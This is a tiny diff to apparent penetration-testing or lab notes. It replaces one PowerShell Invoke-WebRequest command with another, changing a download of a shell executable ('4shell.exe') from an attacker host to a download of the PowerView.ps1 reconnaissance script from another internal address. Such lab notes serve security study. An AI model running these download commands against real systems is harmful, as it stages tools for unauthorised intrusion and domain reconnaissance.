@@ -1,5 +1,5 @@
 ```Powershell
-Invoke-WebRequest -Uri http://10.10.14.96:8000/4shell.exe -OutFile 4shell.exe
+Invoke-WebRequest -Uri http://10.10.14.176:8000/PowerView.ps1 -OutFile PowerView.ps1
 ```
 
 ```Powershell
